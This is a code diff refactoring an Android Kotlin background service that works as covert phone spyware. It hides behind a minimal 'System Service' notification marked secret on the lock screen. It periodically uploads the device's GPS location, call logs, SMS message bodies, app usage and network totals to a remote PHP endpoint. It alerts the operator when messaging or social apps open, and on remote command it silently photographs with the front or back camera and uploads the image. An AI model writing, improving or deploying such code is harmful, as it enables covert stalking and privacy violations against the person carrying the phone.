@@ -5,45 +5,47 @@ import android.content.Context
 import android.content.Intent
 import android.graphics.ImageFormat
 import android.hardware.camera2.*
-import android.location.Location
-import android.location.LocationListener
 import android.location.LocationManager
 import android.media.ImageReader
 import android.net.TrafficStats
 import android.os.*
 import android.provider.CallLog
 import android.provider.Telephony
-import android.util.Base64
 import android.app.usage.UsageStatsManager
+import android.util.Base64
 import androidx.core.app.NotificationCompat
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
+import java.text.SimpleDateFormat
+import java.util.*
 import java.util.concurrent.Executors
 
 class MonitorService : Service() {
 
     private val executor = Executors.newCachedThreadPool()
     private val handler  = Handler(Looper.getMainLooper())
-    private var lastRxBytes = 0L
-    private var lastTxBytes = 0L
+    private var lastRx   = 0L
+    private var lastTx   = 0L
+    private var lastCallTime = 0L
+    private var lastSmsTime  = 0L
 
-    // ============================================
-    // SERVICE START
-    // ============================================
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        createNotificationChannel()
-        startForeground(1, buildNotification())
+        createNotifChannel()
+        startForeground(Config.NOTIF_ID, buildNotif())
 
-        // Send online status
+        lastRx = TrafficStats.getTotalRxBytes()
+        lastTx = TrafficStats.getTotalTxBytes()
+        lastCallTime = System.currentTimeMillis() - 86400000L
+        lastSmsTime  = System.currentTimeMillis() - 86400000L
+
         executor.execute { sendStatus("online") }
 
-        // Start all loops
         startActivityLoop()
         startLocationLoop()
         startCallLogLoop()
         startSmsLoop()
         startNetworkLoop()
-        startCommandPollLoop()
+        startCommandPoll()
 
         return START_STICKY
     }
@@ -54,26 +56,24 @@ class MonitorService : Service() {
         super.onDestroy()
         executor.execute { sendStatus("offline") }
         handler.removeCallbacksAndMessages(null)
+        executor.shutdown()
     }
 
     // ============================================
-    // NOTIFICATION (required for foreground)
+    // NOTIFICATION
     // ============================================
-    private fun createNotificationChannel() {
+    private fun createNotifChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                "monitor_ch", "System Service",
-                NotificationManager.IMPORTANCE_MIN
-            ).apply {
+            val ch = NotificationChannel(Config.NOTIF_CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN).apply {
                 setShowBadge(false)
                 lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
-            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
+            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
         }
     }
 
-    private fun buildNotification(): Notification {
-        return NotificationCompat.Builder(this, "monitor_ch")
+    private fun buildNotif(): Notification {
+        return NotificationCompat.Builder(this, Config.NOTIF_CHANNEL_ID)
             .setContentTitle("System Service")
             .setSmallIcon(android.R.drawable.ic_menu_manage)
             .setPriority(NotificationCompat.PRIORITY_MIN)
@@ -83,89 +83,80 @@ class MonitorService : Service() {
     }
 
     // ============================================
-    // STATUS
+    // HELPERS
     // ============================================
+    private fun now(): String = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+
     private fun sendStatus(status: String) {
         try {
-            val data = JSONObject()
-            data.put("type", "pc_status")
-            data.put("status", status)
-            data.put("timestamp", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
-            ApiClient.post("api.php", data, this)
+            val d = JSONObject()
+            d.put("type", "pc_status")
+            d.put("status", status)
+            d.put("timestamp", now())
+            ApiClient.post("api.php", d, this)
         } catch (e: Exception) {}
     }
 
     // ============================================
-    // ACTIVITY LOOP — app usage + screen status
+    // ACTIVITY LOOP
     // ============================================
     private fun startActivityLoop() {
-        val runnable = object : Runnable {
+        val r = object : Runnable {
             override fun run() {
                 executor.execute {
                     try {
-                        val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
+                        val usm = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
                         val end   = System.currentTimeMillis()
                         val start = end - Config.ACTIVITY_INTERVAL
-                        val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end)
-
-                        var topApp = ""
-                        var topTime = 0L
-                        stats?.forEach { stat ->
-                            if (stat.totalTimeInForeground > topTime) {
-                                topTime = stat.totalTimeInForeground
-                                topApp  = stat.packageName
+                        val stats = usm?.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end)
+                        var topApp = ""; var topTime = 0L
+                        stats?.forEach { s ->
+                            if (s.totalTimeInForeground > topTime) {
+                                topTime = s.totalTimeInForeground; topApp = s.packageName
                             }
                         }
-
-                        // Check alert apps
                         checkAlerts(topApp)
-
-                        val data = JSONObject()
-                        data.put("type", "activity")
-                        data.put("status", "active")
-                        data.put("active_app", topApp)
-                        data.put("active_window", "")
-                        data.put("active_url", "")
-                        ApiClient.post("api.php", data, this@MonitorService)
+                        val d = JSONObject()
+                        d.put("type", "activity")
+                        d.put("status", "active")
+                        d.put("active_app", topApp)
+                        d.put("active_window", "")
+                        d.put("active_url", "")
+                        ApiClient.post("api.php", d, this@MonitorService)
                     } catch (e: Exception) {}
                 }
                 handler.postDelayed(this, Config.ACTIVITY_INTERVAL)
             }
         }
-        handler.post(runnable)
+        handler.post(r)
     }
 
     // ============================================
-    // LOCATION LOOP
+    // LOCATION
     // ============================================
     private fun startLocationLoop() {
-        val runnable = object : Runnable {
+        val r = object : Runnable {
             override fun run() {
                 executor.execute { sendLocation() }
                 handler.postDelayed(this, Config.LOCATION_INTERVAL)
             }
         }
-        handler.post(runnable)
+        handler.post(r)
     }
 
     private fun sendLocation() {
         try {
             val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            var loc: Location? = null
-
-            try { loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (e: Exception) {}
-            if (loc == null) {
-                try { loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (e: Exception) {}
-            }
-
+            var loc = try { lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (e: Exception) { null }
+            if (loc == null) loc = try { lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (e: Exception) { null }
             if (loc != null) {
-                val data = JSONObject()
-                data.put("type", "location")
-                data.put("latitude", loc.latitude)
-                data.put("longitude", loc.longitude)
-                data.put("accuracy", loc.accuracy)
-                data.put("speed", loc.speed)
-                ApiClient.post("api.php", data, this)
+                val d = JSONObject()
+                d.put("type", "location")
+                d.put("latitude", loc.latitude)
+                d.put("longitude", loc.longitude)
+                d.put("accuracy", loc.accuracy)
+                d.put("speed", loc.speed)
+                ApiClient.post("api.php", d, this)
             }
         } catch (e: Exception) {}
     }
@@ -174,9 +165,7 @@ class MonitorService : Service() {
     // CALL LOG
     // ============================================
     private fun startCallLogLoop() {
-        var lastCallTime = System.currentTimeMillis() - 86400000L // Last 24hr
-
-        val runnable = object : Runnable {
+        val r = object : Runnable {
             override fun run() {
                 executor.execute {
                     try {
@@ -187,6 +176,7 @@ class MonitorService : Service() {
                             arrayOf(lastCallTime.toString()),
                             "${CallLog.Calls.DATE} DESC"
                         )
+                        var maxDate = lastCallTime
                         cursor?.use {
                             while (it.moveToNext()) {
                                 val number   = it.getString(0) ?: ""
@@ -194,37 +184,37 @@ class MonitorService : Service() {
                                 val duration = it.getLong(2)
                                 val date     = it.getLong(3)
                                 val name     = it.getString(4) ?: ""
+                                if (date > maxDate) maxDate = date
                                 val callType = when(type) {
                                     CallLog.Calls.INCOMING_TYPE -> "incoming"
                                     CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                     CallLog.Calls.MISSED_TYPE   -> "missed"
                                     else -> "unknown"
                                 }
-                                val data = JSONObject()
-                                data.put("type", "call_log")
-                                data.put("number", number)
-                                data.put("name", name)
-                                data.put("call_type", callType)
-                                data.put("duration", duration)
-                                data.put("call_date", date)
-                                ApiClient.post("api.php", data, this@MonitorService)
+                                val d = JSONObject()
+                                d.put("type", "call_log")
+                                d.put("number", number)
+                                d.put("name", name)
+                                d.put("call_type", callType)
+                                d.put("duration", duration)
+                                d.put("call_date", date)
+                                ApiClient.post("api.php", d, this@MonitorService)
                             }
                         }
+                        if (maxDate > lastCallTime) lastCallTime = maxDate
                     } catch (e: Exception) {}
                 }
                 handler.postDelayed(this, Config.CALL_LOG_INTERVAL)
             }
         }
-        handler.post(runnable)
+        handler.post(r)
     }
 
     // ============================================
-    // SMS LOG
+    // SMS
     // ============================================
     private fun startSmsLoop() {
-        var lastSmsTime = System.currentTimeMillis() - 86400000L
-
-        val runnable = object : Runnable {
+        val r = object : Runnable {
             override fun run() {
                 executor.execute {
                     try {
@@ -235,128 +225,109 @@ class MonitorService : Service() {
                             arrayOf(lastSmsTime.toString()),
                             "${Telephony.Sms.DATE} DESC LIMIT 50"
                         )
+                        var maxDate = lastSmsTime
                         cursor?.use {
                             while (it.moveToNext()) {
-                                val address = it.getString(0) ?: ""
-                                val body    = it.getString(1) ?: ""
-                                val type    = it.getInt(2)
-                                val date    = it.getLong(3)
-                                val smsType = if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "received" else "sent"
-
-                                val data = JSONObject()
-                                data.put("type", "sms_log")
-                                data.put("address", address)
-                                data.put("body", body.take(500))
-                                data.put("sms_type", smsType)
-                                data.put("sms_date", date)
-                                ApiClient.post("api.php", data, this@MonitorService)
+                                val address  = it.getString(0) ?: ""
+                                val body     = it.getString(1) ?: ""
+                                val type     = it.getInt(2)
+                                val date     = it.getLong(3)
+                                if (date > maxDate) maxDate = date
+                                val d = JSONObject()
+                                d.put("type", "sms_log")
+                                d.put("address", address)
+                                d.put("body", body.take(500))
+                                d.put("sms_type", if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "received" else "sent")
+                                d.put("sms_date", date)
+                                ApiClient.post("api.php", d, this@MonitorService)
                             }
                         }
+                        if (maxDate > lastSmsTime) lastSmsTime = maxDate
                     } catch (e: Exception) {}
                 }
                 handler.postDelayed(this, Config.SMS_INTERVAL)
             }
         }
-        handler.post(runnable)
+        handler.post(r)
     }
 
     // ============================================
-    // NETWORK USAGE
+    // NETWORK
     // ============================================
     private fun startNetworkLoop() {
-        lastRxBytes = TrafficStats.getTotalRxBytes()
-        lastTxBytes = TrafficStats.getTotalTxBytes()
-
-        val runnable = object : Runnable {
+        val r = object : Runnable {
             override fun run() {
                 executor.execute {
                     try {
                         val rx = TrafficStats.getTotalRxBytes()
                         val tx = TrafficStats.getTotalTxBytes()
-                        val recvMb = (rx - lastRxBytes) / 1024.0 / 1024.0
-                        val sentMb = (tx - lastTxBytes) / 1024.0 / 1024.0
-                        lastRxBytes = rx
-                        lastTxBytes = tx
-
-                        val data = JSONObject()
-                        data.put("type", "network")
-                        data.put("recv_mb", String.format("%.2f", recvMb).toDouble())
-                        data.put("sent_mb", String.format("%.2f", sentMb).toDouble())
-                        data.put("total_mb", String.format("%.2f", recvMb + sentMb).toDouble())
-                        ApiClient.post("api.php", data, this@MonitorService)
+                        val recvMb = (rx - lastRx) / 1024.0 / 1024.0
+                        val sentMb = (tx - lastTx) / 1024.0 / 1024.0
+                        lastRx = rx; lastTx = tx
+                        val d = JSONObject()
+                        d.put("type", "network")
+                        d.put("recv_mb", "%.2f".format(recvMb).toDouble())
+                        d.put("sent_mb", "%.2f".format(sentMb).toDouble())
+                        d.put("total_mb", "%.2f".format(recvMb + sentMb).toDouble())
+                        ApiClient.post("api.php", d, this@MonitorService)
                     } catch (e: Exception) {}
                 }
-                handler.postDelayed(this, Config.ACTIVITY_INTERVAL)
+                handler.postDelayed(this, Config.NETWORK_INTERVAL)
             }
         }
-        handler.post(runnable)
+        handler.post(r)
     }
 
     // ============================================
-    // ALERTS — app opened
+    // ALERTS
     // ============================================
-    private val ALERT_APPS = listOf(
+    private val ALERT_PKGS = listOf(
         "com.whatsapp", "com.facebook.katana", "com.google.android.youtube",
         "com.instagram.android", "com.twitter.android", "com.netflix.mediaclient",
-        "org.telegram.messenger", "com.tiktok"
+        "org.telegram.messenger", "com.zhiliaoapp.musically"
     )
-    private var lastAlertApp = ""
+    private var lastAlertPkg = ""
 
-    private fun checkAlerts(packageName: String) {
-        if (packageName.isEmpty()) return
-        for (app in ALERT_APPS) {
-            if (packageName.contains(app) || app.contains(packageName)) {
-                if (lastAlertApp != packageName) {
-                    lastAlertApp = packageName
+    private fun checkAlerts(pkg: String) {
+        if (pkg.isEmpty()) return
+        for (a in ALERT_PKGS) {
+            if (pkg == a || pkg.contains(a) || a.contains(pkg)) {
+                if (lastAlertPkg != pkg) {
+                    lastAlertPkg = pkg
                     try {
-                        val data = JSONObject()
-                        data.put("type", "alert")
-                        data.put("alert_type", "app_opened")
-                        data.put("description", "Android: $packageName opened")
-                        ApiClient.post("api.php", data, this)
+                        val d = JSONObject()
+                        d.put("type", "alert")
+                        d.put("alert_type", "app_opened")
+                        d.put("description", "Android: $pkg opened")
+                        ApiClient.post("api.php", d, this)
                     } catch (e: Exception) {}
                 }
                 return
             }
         }
-        lastAlertApp = ""
+        lastAlertPkg = ""
     }
 
     // ============================================
-    // COMMAND POLL — screenshot/webcam
+    // COMMAND POLL — screenshot / webcam
     // ============================================
-    private fun startCommandPollLoop() {
-        val runnable = object : Runnable {
+    private fun startCommandPoll() {
+        val r = object : Runnable {
             override fun run() {
                 executor.execute {
                     try {
-                        val response = ApiClient.get("screenshot_cmd.php", mapOf("action" to "poll"), this@MonitorService)
-                        val cmd = response?.optString("command") ?: ""
-
+                        val resp   = ApiClient.get("screenshot_cmd.php", mapOf("action" to "poll"), this@MonitorService)
+                        val cmd    = resp?.optString("command") ?: ""
+                        val cmdId  = resp?.optInt("command_id") ?: 0
                         when (cmd) {
-                            "screenshot" -> {
-                                val cmdId = response?.optInt("command_id") ?: 0
-                                takeScreenshot(cmdId)
-                            }
-                            "webcam" -> {
-                                val cmdId = response?.optInt("command_id") ?: 0
-                                takeCameraPhoto(cmdId, useFront = true)
-                            }
+                            "screenshot", "webcam" -> takeCameraPhoto(cmdId, useFront = (cmd == "webcam"))
                         }
                     } catch (e: Exception) {}
                 }
                 handler.postDelayed(this, Config.POLL_INTERVAL)
             }
         }
-        handler.post(runnable)
-    }
-
-    // ============================================
-    // SCREENSHOT (Android screenshot needs root - send blank with message)
-    // ============================================
-    private fun takeScreenshot(cmdId: Int) {
-        // Android screenshot without root not possible - send camera instead
-        takeCameraPhoto(cmdId, useFront = false)
+        handler.post(r)
     }
 
     // ============================================
@@ -364,60 +335,49 @@ class MonitorService : Service() {
     // ============================================
     private fun takeCameraPhoto(cmdId: Int, useFront: Boolean) {
         try {
-            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val manager  = getSystemService(Context.CAMERA_SERVICE) as CameraManager
             val cameraId = manager.cameraIdList.firstOrNull { id ->
-                val facing = manager.getCameraCharacteristics(id)
-                    .get(CameraCharacteristics.LENS_FACING)
+                val facing = manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING)
                 if (useFront) facing == CameraCharacteristics.LENS_FACING_FRONT
                 else facing == CameraCharacteristics.LENS_FACING_BACK
             } ?: manager.cameraIdList.firstOrNull() ?: return
 
             val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
-
             imageReader.setOnImageAvailableListener({ reader ->
                 val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                 try {
                     val buffer = image.planes[0].buffer
-                    val bytes  = ByteArray(buffer.remaining())
-                    buffer.get(bytes)
-                    val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-
-                    val data = JSONObject()
-                    data.put("command_id", cmdId)
-                    data.put("image", b64)
-                    data.put("image_type", if (useFront) "webcam" else "screenshot")
-                    ApiClient.post("screenshot_cmd.php?action=upload", data, this)
+                    val bytes  = ByteArray(buffer.remaining()).also { buffer.get(it) }
+                    val b64    = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                    val d = JSONObject()
+                    d.put("command_id", cmdId)
+                    d.put("image", b64)
+                    d.put("image_type", if (useFront) "webcam" else "screenshot")
+                    ApiClient.post("screenshot_cmd.php?action=upload", d, this)
+                } catch (e: Exception) {
                 } finally {
                     image.close()
                     imageReader.close()
                 }
             }, handler)
 
-            val callback = object : CameraDevice.StateCallback() {
+            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
                     try {
-                        val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
-                        captureRequest.addTarget(imageReader.surface)
-
-                        camera.createCaptureSession(
-                            listOf(imageReader.surface),
-                            object : CameraCaptureSession.StateCallback() {
-                                override fun onConfigured(session: CameraCaptureSession) {
-                                    session.capture(captureRequest.build(), null, handler)
-                                    handler.postDelayed({ camera.close() }, 2000)
-                                }
-                                override fun onConfigureFailed(session: CameraCaptureSession) {
-                                    camera.close()
-                                }
-                            }, handler
-                        )
+                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                        req.addTarget(imageReader.surface)
+                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(s: CameraCaptureSession) {
+                                s.capture(req.build(), null, handler)
+                                handler.postDelayed({ camera.close() }, 3000)
+                            }
+                            override fun onConfigureFailed(s: CameraCaptureSession) { camera.close() }
+                        }, handler)
                     } catch (e: Exception) { camera.close() }
                 }
                 override fun onDisconnected(camera: CameraDevice) { camera.close() }
                 override fun onError(camera: CameraDevice, error: Int) { camera.close() }
-            }
-
-            manager.openCamera(cameraId, callback, handler)
+            }, handler)
         } catch (e: Exception) {}
     }
 }
